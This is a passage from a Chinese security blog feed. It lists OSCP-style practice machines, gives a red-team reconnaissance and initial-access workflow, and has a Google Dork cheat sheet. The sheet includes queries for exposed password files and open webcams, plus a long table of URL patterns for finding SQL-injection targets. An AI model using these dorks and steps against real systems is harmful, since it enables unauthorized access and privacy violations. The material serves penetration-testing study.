<p>创建并进入环境：mkvirtualenv env1<br>退出环境：deactivate<br>进入已存在的环境或者切换环境：workon env1或者env2<br>删除环境： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rmvirtualenv env1</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>优秀靶机推荐</title>
    <url>/posts/8822d497.html</url>
    <content><![CDATA[<h1 id="VulnHub"><a href="#VulnHub" class="headerlink" title="VulnHub"></a>VulnHub</h1><h2 id="VMs-Highlighted-in-pink-are-considered-to-be-similar-to-OSCP"><a href="#VMs-Highlighted-in-pink-are-considered-to-be-similar-to-OSCP" class="headerlink" title="VMs Highlighted in pink are considered to be similar to OSCP"></a>VMs Highlighted in pink are considered to be similar to OSCP</h2><p>Kioptrix: Level 1 (#1): <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a><br>Kioptrix: Level 1.1 (#2): <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">https://www.vulnhub.com/entry/kioptrix-level-11-2,23/</a><br>Kioptrix: Level 1.2 (#3): <a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</a><br>Kioptrix: Level 1.3 (#4): <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25">https://www.vulnhub.com/entry/kioptrix-level-13-4,25</a><br>Kioptrix: 2014: <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">https://www.vulnhub.com/entry/kioptrix-2014-5,62/</a><br>FristiLeaks 1.3: <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">https://www.vulnhub.com/entry/fristileaks-13,133/</a><br>Stapler 1: <a href="https://www.vulnhub.com/entry/stapler-1,150/">https://www.vulnhub.com/entry/stapler-1,150/</a><br>VulnOS 2: <a href="https://www.vulnhub.com/entry/vulnos-2,147/">https://www.vulnhub.com/entry/vulnos-2,147/</a><br>SickOs 1.2: <a href="https://www.vulnhub.com/entry/sickos-12,144/">https://www.vulnhub.com/entry/sickos-12,144/</a><br>Brainpan 1: <a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/</a><br>HackLAB: Vulnix: <a href="https://www.vulnhub.com/entry/hacklab-vulnix,48/">https://www.vulnhub.com/entry/hacklab-vulnix,48/</a><br>&#x2F;dev&#x2F;random: scream: <a href="https://www.vulnhub.com/entry/devrandom-scream,47/">https://www.vulnhub.com/entry/devrandom-scream,47/</a><br>pWnOS 2.0: <a href="https://www.vulnhub.com/entry/pwnos-20-pre-release,34/">https://www.vulnhub.com/entry/pwnos-20-pre-release,34/</a><br>SkyTower 1: <a href="https://www.vulnhub.com/entry/skytower-1,96/">https://www.vulnhub.com/entry/skytower-1,96/</a><br>Mr-Robot 1: <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">https://www.vulnhub.com/entry/mr-robot-1,151/</a><br>PwnLab: <a href="https://www.vulnhub.com/entry/pwnlab-init,158/">https://www.vulnhub.com/entry/pwnlab-init,158/</a><br>Lin.Security: <a href="https://www.vulnhub.com/entry/linsecurity-1,244/">https://www.vulnhub.com/entry/linsecurity-1,244/</a><br>Temple of Doom: <a href="https://www.vulnhub.com/entry/temple-of-doom-1,243/">https://www.vulnhub.com/entry/temple-of-doom-1,243/</a><br>Pinkys Palace v1: <a href="https://www.vulnhub.com/entry/pinkys-palace-v1,225/">https://www.vulnhub.com/entry/pinkys-palace-v1,225/</a><br>Pinkys Palace v2: <a href="https://www.vulnhub.com/entry/pinkys-palace-v2,229/">https://www.vulnhub.com/entry/pinkys-palace-v2,229/</a><br>Zico2: <a href="https://www.vulnhub.com/entry/zico2-1,210/">https://www.vulnhub.com/entry/zico2-1,210/</a><br>Wintermute: <a href="https://www.vulnhub.com/entry/wintermute-1,239/">https://www.vulnhub.com/entry/wintermute-1,239/</a><br>Lord of the root 1.0.1: <a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">https://www.vulnhub.com/entry/lord-of-the-root-101,129/</a><br>Tr0ll 1: <a href="https://www.vulnhub.com/entry/tr0ll-1,100/">https://www.vulnhub.com/entry/tr0ll-1,100/</a><br>Tr0ll 2: <a href="https://www.vulnhub.com/entry/tr0ll-2,107/">https://www.vulnhub.com/entry/tr0ll-2,107/</a><br>Web Developer 1: <a href="https://www.vulnhub.com/entry/web-developer-1,288/">https://www.vulnhub.com/entry/web-developer-1,288/</a><br>SolidState: <a href="https://www.vulnhub.com/entry/solidstate-1,261/">https://www.vulnhub.com/entry/solidstate-1,261/</a><br>Hackme 1: <a href="https://www.vulnhub.com/entry/hackme-1,330/">https://www.vulnhub.com/entry/hackme-1,330/</a><br>Escalate_Linux: 1: <a href="https://www.vulnhub.com/entry/escalate_linux-1,323/">https://www.vulnhub.com/entry/escalate_linux-1,323/</a><br>DC 6: <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a><br>New Boxes (March 2020):<br>DC 9: <a href="https://www.vulnhub.com/entry/dc-9,412/">https://www.vulnhub.com/entry/dc-9,412/</a><br>Digitalworld.local (Bravery): <a href="https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/">https://www.vulnhub.com/entry/digitalworldlocal-bravery,281/</a><br>Digitalworld.local (Development): <a href="https://www.vulnhub.com/entry/digitalworldlocal-development,280/">https://www.vulnhub.com/entry/digitalworldlocal-development,280/</a><br>Digitalworld.local (Mercy v2): <a href="https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/">https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/</a><br>Digitalworld.local (JOY): <a href="https://www.vulnhub.com/entry/digitalworldlocal-joy,298/">https://www.vulnhub.com/entry/digitalworldlocal-joy,298/</a><br>Prime 1: <a href="https://www.vulnhub.com/entry/prime-1,358/">https://www.vulnhub.com/entry/prime-1,358/</a><br>Symfonos 1: <a href="https://www.vulnhub.com/entry/symfonos-1,322/">https://www.vulnhub.com/entry/symfonos-1,322/</a><br>Symfonos 2: <a href="https://www.vulnhub.com/entry/symfonos-2,331/">https://www.vulnhub.com/entry/symfonos-2,331/</a><br>Symfonos 3: <a href="https://www.vulnhub.com/entry/symfonos-3,332/">https://www.vulnhub.com/entry/symfonos-3,332/</a><br>Symfonos 4: <a href="https://www.vulnhub.com/entry/symfonos-4,347/">https://www.vulnhub.com/entry/symfonos-4,347/</a><br>Symfonos 5.2: <a href="https://www.vulnhub.com/entry/symfonos-52,415/">https://www.vulnhub.com/entry/symfonos-52,415/</a><br>Misdirection 1: <a href="https://www.vulnhub.com/entry/misdirection-1,371/">https://www.vulnhub.com/entry/misdirection-1,371/</a><br>Sar 1: <a href="https://www.vulnhub.com/entry/sar-1,425/">https://www.vulnhub.com/entry/sar-1,425/</a><br>Djinn 1: <a href="https://www.vulnhub.com/entry/djinn-1,397/">https://www.vulnhub.com/entry/djinn-1,397/</a><br>EVM 1: <a href="https://www.vulnhub.com/entry/evm-1,391/">https://www.vulnhub.com/entry/evm-1,391/</a><br>DerpNStink 1: <a href="https://www.vulnhub.com/entry/derpnstink-1,221/">https://www.vulnhub.com/entry/derpnstink-1,221/</a><br>RickdiculouslyEasy 1: <a href="https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/">https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/</a><br>Tommy Boy 1: <a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">https://www.vulnhub.com/entry/tommy-boy-1,157/</a><br>Breach 1: <a href="https://www.vulnhub.com/entry/breach-1,152/">https://www.vulnhub.com/entry/breach-1,152/</a><br>Breach 2.1: <a href="https://www.vulnhub.com/entry/breach-21,159/">https://www.vulnhub.com/entry/breach-21,159/</a><br>Breach 3.0.1: <a href="https://www.vulnhub.com/entry/breach-301,177/">https://www.vulnhub.com/entry/breach-301,177/</a><br>NullByte: <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">https://www.vulnhub.com/entry/nullbyte-1,126/</a><br>Bob 1.0.1: <a href="https://www.vulnhub.com/entry/bob-101,226/">https://www.vulnhub.com/entry/bob-101,226/</a><br>Toppo 1: <a href="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a><br>W34kn3ss 1: <a href="https://www.vulnhub.com/entry/w34kn3ss-1,270/">https://www.vulnhub.com/entry/w34kn3ss-1,270/</a><br>GoldenEye 1: <a href="https://www.vulnhub.com/entry/goldeneye-1,240/">https://www.vulnhub.com/entry/goldeneye-1,240/</a></p>
<hr>
<h2 id="Other-VM’s-to-check-out"><a href="#Other-VM’s-to-check-out" class="headerlink" title="Other VM’s to check out!"></a>Other VM’s to check out!</h2><p>IMF: <a href="https://www.vulnhub.com/entry/imf-1,162/">https://www.vulnhub.com/entry/imf-1,162/</a><br>Tommy Boy: <a href="https://www.vulnhub.com/entry/tommy-boy-1,157/">https://www.vulnhub.com/entry/tommy-boy-1,157/</a><br>Billy Madison: <a href="https://www.vulnhub.com/entry/billy-madison-11,161/">https://www.vulnhub.com/entry/billy-madison-11,161/</a><br>Tr0ll1: <a href="https://www.vulnhub.com/entry/tr0ll-1,100/">https://www.vulnhub.com/entry/tr0ll-1,100/</a><br>Tr0ll2: <a href="https://www.vulnhub.com/entry/tr0ll-2,107/">https://www.vulnhub.com/entry/tr0ll-2,107/</a><br>Wallaby’s Nightmare: <a href="https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/">https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/</a><br>Moria: <a href="https://www.vulnhub.com/entry/moria-1,187/">https://www.vulnhub.com/entry/moria-1,187/</a><br>BSides Vancouver 2018: <a href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/">https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/</a><br>DEFCON Toronto Galahad: <a href="https://www.vulnhub.com/entry/defcon-toronto-galahad,194/">https://www.vulnhub.com/entry/defcon-toronto-galahad,194/</a><br>Spydersec: <a href="https://www.vulnhub.com/entry/spydersec-challenge,128/">https://www.vulnhub.com/entry/spydersec-challenge,128/</a><br>Pinkys Palace v3: <a href="https://www.vulnhub.com/entry/pinkys-palace-v3,237/">https://www.vulnhub.com/entry/pinkys-palace-v3,237/</a><br>Pinkys Palace v4: <a href="https://www.vulnhub.com/entry/pinkys-palace-v4,265/">https://www.vulnhub.com/entry/pinkys-palace-v4,265/</a><br>Vulnerable Docker 1: <a href="https://www.vulnhub.com/entry/vulnerable-docker-1,208/">https://www.vulnhub.com/entry/vulnerable-docker-1,208/</a><br>Node 1: <a href="https://www.vulnhub.com/entry/node-1,252/">https://www.vulnhub.com/entry/node-1,252/</a><br>Troll 3: <a href="https://www.vulnhub.com/entry/tr0ll-3,340/">https://www.vulnhub.com/entry/tr0ll-3,340/</a><br>Readme 1: <a href="https://www.vulnhub.com/entry/readme-1,336/">https://www.vulnhub.com/entry/readme-1,336/</a><br>OZ: <a href="https://www.vulnhub.com/entry/oz-1,317/">https://www.vulnhub.com/entry/oz-1,317/</a><br>Metasploitable 3: <a href="https://github.com/rapid7/metasploitable3">https://github.com/rapid7/metasploitable3</a></p>
<hr>
<h1 id="HackTheBox"><a href="#HackTheBox" class="headerlink" title="HackTheBox"></a>HackTheBox</h1><h2 id="Linux-Boxes"><a href="#Linux-Boxes" class="headerlink" title="Linux Boxes:"></a>Linux Boxes:</h2><p>Lame<br>brainfuck<br>shocker<br>bashed<br>nibbles<br>beep<br>cronos<br>nineveh<br>sense<br>solidstate<br>node<br>valentine<br>poison<br>sunday<br>tartarsauce<br>Irked<br>Friendzone<br>Swagshop<br>Networked<br>jarvis</p>
<hr>
<h2 id="Windows-Boxes"><a href="#Windows-Boxes" class="headerlink" title="Windows Boxes:"></a>Windows Boxes:</h2><p>legacy<br>Blue<br>Devel<br>Optimum<br>Bastard<br>granny<br>Arctic<br>grandpa<br>silo<br>bounty<br>jerry<br>conceal<br>chatterbox<br>Forest<br>BankRobber</p>
<hr>
<h2 id="More-challenging-than-OSCP-but-good-practice"><a href="#More-challenging-than-OSCP-but-good-practice" class="headerlink" title="More challenging than OSCP, but good practice:"></a>More challenging than OSCP, but good practice:</h2><p>Jeeves [Windows]<br>Bart   [Windows]<br>Tally  [Windows]<br>Active [Windows]<br>Kotarak [Linux]<br>falafel [Linux]<br>Devops [Linux]<br>Hawk [Linux]<br>Netmon [Windows]<br>Lightweight [Linux]<br>La Casa De Papel [Linux]<br>Jail [Linux]<br>Safe [Linux]<br>Bitlab [Linux]</p>
<hr>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始模拟学习红队（一）</title>
    <url>/posts/5660515c.html</url>
    <content><![CDATA[<h1 id="从零开始模拟学习红队之信息收集篇"><a href="#从零开始模拟学习红队之信息收集篇" class="headerlink" title="从零开始模拟学习红队之信息收集篇"></a>从零开始模拟学习红队之信息收集篇</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本笔记是记录从零开始模拟红队的攻击，做到批量化、自动化、专业化。</p>
<p>去学习、总结如何成为一名专业的红队攻击者。</p>
<h2 id="0x01-前辈的总结"><a href="#0x01-前辈的总结" class="headerlink" title="0x01 前辈的总结"></a>0x01 前辈的总结</h2><blockquote>
<p>来自：<a href="https://github.com/biggerduck/RedTeamNotes/blob/main/%E7%BA%A2%E9%98%9F%E5%9F%BA%E6%93%8D2-%E5%A4%96%E7%BD%91%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95%26%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93.pdf">https://github.com/biggerduck/RedTeamNotes/blob/main/%E7%BA%A2%E9%98%9F%E5%9F%BA%E6%93%8D2-%E5%A4%96%E7%BD%91%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9%E6%96%B9%E6%B3%95%26%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93.pdf</a></p>
</blockquote>
<p>1、当项目经理告诉了你攻击目标的时候 →得到公司名→上企查查搜公司名→搜出来一堆公司和子<br>公司<br>2、拿到这堆公司和子公司的名字→oneforall来跑一遍→然后得到了一堆子域名<br>3、拿到这堆子域名丢给Eeyes跑一遍→得到对应子域名对应的ip和c段信息<br>4、将对应ip和c段丢给fofa和fscan→fofa能快速得到c段资产信息，fscan能快速扫一遍，顺便帮<br>你打一下常用漏洞<br>5、如果你的运气足够好，这个时候fscan已经有漏洞爆出来了，可以直接去利用了（小概率事<br>件），但是如果你的运气不好，就要看接下来的第6步<br>6、刚刚fofa得到的资产看一眼，这里可以配合ehole的指纹识别来帮助快速筛选，通过筛选敏感<br>资产，例如shiro，fastjson等直接能够反序列化getshell的资产（小概率事件），如果你的运气<br>好，那么这个时候已经有漏洞了，可以直接利用了，如果你的运气不好，就要看接下来的第7步<br>7、通过上面一番筛选，时间已经过去很久了，但是目前却毫无进展，其实心里有点郁闷，这个时<br>候就不建议再搞了，先休息一下，调整下心态，不然后续的几天会大幅度降低工作效率，休息好了<br>感觉又可以了，就看看下面的步骤8继续吧<br>8、其实经过上面的一番筛选，web这块的基本已经过完了，但是依旧还没有漏洞，说明这个系统<br>平时自查搞的比较多，基本的高危漏洞修复已经完成了，如果是大型攻防演练，那就建议换个目标<br>再用上面的方法轮一次，如果是就某家单位做的定向攻防，就继续看步骤9吧<br>9、web的过完了，虽然没有直接能够rce的系统，但是我们获得了很多形形色色的登录后台\用户<br>登录\注册\管理员登录等等等等交互类型的资产，这些资产虽然看起来没用，但是我这里要介绍一<br>下攻防演练的三板斧漏洞，运气好的话，这些资产还是能够派上用场的<br>三板斧其一 反序列化漏洞：这个不用多说，我最喜欢的漏洞，只要有了这个漏洞，基本一台机子<br>的shell就拿到了，看到就眼睛放光，但是可遇不可求，遍地都是shiro的时代已经渐渐过去了。<br>三板斧其二 文件上传：这个也是老熟人了，一般我会先看看是不是白名单，是白名单的话，就看<br>看有没有文件包含之类的漏洞能组合利用下，如果是黑名单，就把文件上传的姿势对着上传点全部<br>来一遍，看看有没有一个能中，如果能中，那就有了一个shell（没路径连不上但是确实是<br>shell），虽然找上传路径也是一个拦路虎，但是至少比传不上去强。<br>三板斧其三 sql注入：这个更加老熟人了，注入之后，低权限，直接gg，高权限，试试吧，看能不<br>能上shell。<br>至于其他漏洞，攻防演练就那么几天时间，八成是用不上，建议直接放弃，就把上面三个玩精（仅<br>仅就攻防项目来说）。<br>10、对各种登录系统尝试弱口令&#x2F;sql注入攻击，弱口令能登进去后台就找上传点，sql注入建议<br>xray+burp来测，看到有戏的再上sqlmap。<br>还有一些信息搜集的方法，比如fofa搜关键字，title&#x3D;”单位名”等，这种方法可以自行穿插灵活使<br>用，有时候有奇效，有时候没啥效果，看个人造化了。<br>还有些天选之人，直接一个弱口令登云桌面（horizon、vdi等）然后拿shell的，这种属于天赐<br>shell，不在常规考虑范围之内，但也可以尝试。<br>11、弱口令如果爆不出账号密码，就考虑上网盘\github\sgk\泄露公开库搜对应人员的信息，看<br>看好使不<br>12、如果还是没有用，就可以开始看公众号\app\小程序的信息<br>13、如果还是没有用，就要开始用域传送\备案号\ip反查网站\ssl证书\用google来搜c段<br>14、如果还是没有用，就用dirmap\dirsearch来对可疑的网站进行目录爆破，看看好使不<br>15、如果还是没有用，还可以钓鱼，发邮件也是一个体力活<br>16、如果还是没有用，拿上设备跟领导申请近源渗透吧</p>
<hr>
<h2 id="0x02-我的总结"><a href="#0x02-我的总结" class="headerlink" title="0x02 我的总结"></a>0x02 我的总结</h2><p>相较于各种形式的工具，我觉得自动化的、全面的才是最好的所以我选择。</p>
<p>我的渗透测试三板斧是：Goby + OneForAll + Fofa + Fscan</p>
<p>这四者是我认为比较自动化和快速打点的一种方法。</p>
<p>首先是 Goby，它拥有庞大的指纹库，可以快速获取备案，可以通过内置 awvs 插件快速分发扫描任务，可以通过 Fofa 导入目标来进行扫描，并且它自带的大量 Poc 也可以满足我们对目标的漏洞扫描。</p>
<blockquote>
<p>谈到 Poc,不得不谈到 Poc 框架，比如 Pocsuite3，nuclei，拼凑的 Poc&amp;exp 脚本，最终总结出一个道理，Poc 框架的选择主要取决于其生态环境和其次是编写难度，我们应该尽量去使用有一个生态的 Poc 框架，这样可以免去我们大量自己编写 Poc 的时间。</p>
<p>而生态库的话，Pocsuite ，poc 的编写看似复杂，实则十分容易上手，但是致命缺点是生态环境不够好。而 nuclei 的话，简化了编写的难度和自身是一个优秀的框架和自带 nuclei-templates。Goby 编写简单，自带很多比较新的 poc，生态环境也很好。所以我选择 Goby。</p>
</blockquote>
<p>我的信息收集方法是通过 Goby 内置的 fofa 插件导入扫描目标，由 goby 进行端口和 poc 扫描。</p>
<p>分工明确，fofa 发现资产，Goby 扫描端口和漏洞。如果没有结果的话，还可以尝试一下 OneForAll（我使用 OneForAll 的原因很简单，因为它曾经发现了一个其他子域名扫描工具没有发现的子域名）。</p>
<p>如果简单的扫描没有发现漏洞，那就需要手工去测试了。</p>
<p>我的手工测试 CheckList 是：</p>
<ol>
<li><p>弱口令爆破&#x2F;sql注入</p>
</li>
<li><p>上BurpSuite自个造，尝试fuzzing和逻辑漏洞(登录bypass&#x2F;注册&#x2F;越权等等)</p>
</li>
<li><p>目录爆破</p>
</li>
<li><p>app&#x2F;小程序</p>
</li>
<li><p>信息泄露(html&#x2F;js&#x2F;phpinfo&#x2F;github&#x2F;网盘&#x2F;baidu)</p>
</li>
<li><p>全都没有的话直接寄</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>Google Dork</title>
    <url>/posts/a8967205.html</url>
    <content><![CDATA[<h3 id="信息收集之Google-Dork"><a href="#信息收集之Google-Dork" class="headerlink" title="信息收集之Google Dork"></a>信息收集之Google Dork</h3><h4 id="一、查找网站参数"><a href="#一、查找网站参数" class="headerlink" title="一、查找网站参数"></a>一、查找网站参数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.intitle:找到网站html代码中含有指定条件的页面</span><br><span class="line">eg:</span><br><span class="line">	intile:login page</span><br><span class="line">2.alintitle:找到网站html代码中含有特定参数的页面</span><br><span class="line">eg:</span><br><span class="line">	alintile:login page</span><br><span class="line">3.inurl:找到网站代码中的超链接URL参数</span><br><span class="line">eg:</span><br><span class="line">	inurl:login.php  	</span><br><span class="line">	inurl:proftpdpasswd</span><br><span class="line">4.allinurl:找到网站代码中所有超链接URL参数</span><br><span class="line">eg:</span><br><span class="line">	allinurl:login.php</span><br><span class="line">5.define: 谷歌会根据条件查找相关信息</span><br><span class="line">eg:</span><br><span class="line">	define:sql syntax error</span><br><span class="line">6.site: 谷歌会查找指定参数的网站信息。</span><br><span class="line">eg:</span><br><span class="line">	site:hackingnewstutorials.com</span><br><span class="line">7.link:查找有sql注入漏洞的链接。</span><br><span class="line">eg:</span><br><span class="line">	link:inde.php?id=</span><br></pre></td></tr></table></figure>

<h4 id="二、查找文件参数"><a href="#二、查找文件参数" class="headerlink" title="二、查找文件参数"></a>二、查找文件参数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1,filetype:查找指定文件格式。</span><br><span class="line">eg:</span><br><span class="line">	filetype:pdf</span><br><span class="line">2.intitle:直接查找网站文件目录下的指定文件。</span><br><span class="line">eg:</span><br><span class="line">	intitle:index of mp3</span><br><span class="line">3.book: 查找书籍参数。</span><br><span class="line">eg:</span><br><span class="line">	book:java</span><br></pre></td></tr></table></figure>

<h4 id="三、查找用户名和密码文件参数"><a href="#三、查找用户名和密码文件参数" class="headerlink" title="三、查找用户名和密码文件参数"></a>三、查找用户名和密码文件参数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intext: passwords filetype: txt</span><br><span class="line">mysql history files</span><br><span class="line">intext: account details filetype: txt</span><br><span class="line">intitle:index.of intext:”secring .skr”|&amp;q…</span><br><span class="line">people.lst</span><br><span class="line">passwd</span><br><span class="line">master.passwd</span><br><span class="line">pwd.db</span><br><span class="line">htpasswd / htpasswd.bak</span><br><span class="line">htpasswd / htgroup</span><br><span class="line">spwd.db / passwd</span><br><span class="line">passwd / etc (reliable)</span><br><span class="line">config.php</span><br><span class="line">passlist</span><br></pre></td></tr></table></figure>

<h4 id="四、查找监控摄像头"><a href="#四、查找监控摄像头" class="headerlink" title="四、查找监控摄像头"></a>四、查找监控摄像头</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Inurl:”CgiStart?page=”</span><br><span class="line">inurl:view.shtml</span><br><span class="line">intitle:”Live View / – AXIS</span><br><span class="line">inurl:view/view.shtml</span><br><span class="line">inurl:ViewerFrame?Mode=</span><br><span class="line">inurl:ViewerFrame?Mode=Refresh</span><br><span class="line">inurl:axis-cgi/jpg</span><br><span class="line">inurl:axis-cgi/mjpg (motion-JPEG) (disconnected)</span><br><span class="line">inurl:view/indexFrame.shtml</span><br><span class="line">inurl:view/index.shtml</span><br><span class="line">inurl:view/view.shtml</span><br><span class="line">liveapplet</span><br><span class="line">intitle:”live view” intitle:axis</span><br><span class="line">intitle:liveapplet</span><br><span class="line">allintitle:”Network Camera NetworkCamera” (disconnected)</span><br><span class="line">intitle:axis intitle:”video server”</span><br><span class="line">intitle:liveapplet inurl:LvAppl</span><br><span class="line">intitle:”EvoCam” inurl:”webcam.html”</span><br><span class="line">intitle:”Live NetSnap Cam-Server feed”</span><br><span class="line">intitle:”Live View / – AXIS”</span><br><span class="line">inurl:indexFrame.shtml Axis</span><br></pre></td></tr></table></figure>

<h4 id="五、拓展"><a href="#五、拓展" class="headerlink" title="五、拓展"></a>五、拓展</h4><table>
<thead>
<tr>
<th align="left">Google Dork string Column 1</th>
<th align="left">Google Dork string Column 2</th>
<th align="left">Google Dork string Column 3</th>
</tr>
</thead>
<tbody><tr>
<td align="left">inurl:item_id&#x3D;</td>
<td align="left">inurl:review.php?id&#x3D;</td>
<td align="left">inurl:hosting_info.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:newsid&#x3D;</td>
<td align="left">inurl:iniziativa.php?in&#x3D;</td>
<td align="left">inurl:gallery.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:trainers.php?id&#x3D;</td>
<td align="left">inurl:curriculum.php?id&#x3D;</td>
<td align="left">inurl:rub.php?idr&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:news-full.php?id&#x3D;</td>
<td align="left">inurl:labels.php?id&#x3D;</td>
<td align="left">inurl:view_faq.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:news_display.php?getid&#x3D;</td>
<td align="left">inurl:story.php?id&#x3D;</td>
<td align="left">inurl:artikelinfo.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:index2.php?option&#x3D;</td>
<td align="left">inurl:look.php?ID&#x3D;</td>
<td align="left">inurl:detail.php?ID&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:readnews.php?id&#x3D;</td>
<td align="left">inurl:newsone.php?id&#x3D;</td>
<td align="left">inurl:index.php?&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:top10.php?cat&#x3D;</td>
<td align="left">inurl:aboutbook.php?id&#x3D;</td>
<td align="left">inurl:profile_view.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:newsone.php?id&#x3D;</td>
<td align="left">inurl:material.php?id&#x3D;</td>
<td align="left">inurl:category.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:event.php?id&#x3D;</td>
<td align="left">inurl:opinions.php?id&#x3D;</td>
<td align="left">inurl:publications.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:product-item.php?id&#x3D;</td>
<td align="left">inurl:announce.php?id&#x3D;</td>
<td align="left">inurl:fellows.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:sql.php?id&#x3D;</td>
<td align="left">inurl:rub.php?idr&#x3D;</td>
<td align="left">inurl:downloads_info.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:index.php?catid&#x3D;</td>
<td align="left">inurl:galeri_info.php?l&#x3D;</td>
<td align="left">inurl:prod_info.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:news.php?catid&#x3D;</td>
<td align="left">inurl:tekst.php?idt&#x3D;</td>
<td align="left">inurl:shop.php?do&#x3D;part&amp;id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:index.php?id&#x3D;</td>
<td align="left">inurl:newscat.php?id&#x3D;</td>
<td align="left">inurl:productinfo.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:news.php?id&#x3D;</td>
<td align="left">inurl:newsticker_info.php?idn&#x3D;</td>
<td align="left">inurl:collectionitem.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:index.php?id&#x3D;</td>
<td align="left">inurl:rubrika.php?idr&#x3D;</td>
<td align="left">inurl:band_info.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:trainers.php?id&#x3D;</td>
<td align="left">inurl:rubp.php?idr&#x3D;</td>
<td align="left">inurl:product.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:buy.php?category&#x3D;</td>
<td align="left">inurl:offer.php?idf&#x3D;</td>
<td align="left">inurl:releases.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:article.php?ID&#x3D;</td>
<td align="left">inurl:art.php?idm&#x3D;</td>
<td align="left">inurl:ray.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:play_old.php?id&#x3D;</td>
<td align="left">inurl:title.php?id&#x3D;</td>
<td align="left">inurl:produit.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:declaration_more.php?decl_id&#x3D;</td>
<td align="left">inurl:news_view.php?id&#x3D;</td>
<td align="left">inurl:pop.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:pageid&#x3D;</td>
<td align="left">inurl:select_biblio.php?id&#x3D;</td>
<td align="left">inurl:shopping.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:games.php?id&#x3D;</td>
<td align="left">inurl:humor.php?id&#x3D;</td>
<td align="left">inurl:productdetail.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:page.php?file&#x3D;</td>
<td align="left">inurl:aboutbook.php?id&#x3D;</td>
<td align="left">inurl:post.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:newsDetail.php?id&#x3D;</td>
<td align="left">inurl:ogl_inet.php?ogl_id&#x3D;</td>
<td align="left">inurl:viewshowdetail.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:gallery.php?id&#x3D;</td>
<td align="left">inurl:fiche_spectacle.php?id&#x3D;</td>
<td align="left">inurl:clubpage.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:article.php?id&#x3D;</td>
<td align="left">inurl:communique_detail.php?id&#x3D;</td>
<td align="left">inurl:memberInfo.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:show.php?id&#x3D;</td>
<td align="left">inurl:sem.php3?id&#x3D;</td>
<td align="left">inurl:section.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:staff_id&#x3D;</td>
<td align="left">inurl:kategorie.php4?id&#x3D;</td>
<td align="left">inurl:theme.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:newsitem.php?num&#x3D;</td>
<td align="left">inurl:news.php?id&#x3D;</td>
<td align="left">inurl:page.php?id&#x3D;</td>
</tr>
<tr>
<td align="left">inurl:readnews.php?id&#x3D;</td>
<td align="left">inurl:index.php?id&#x3D;</td>
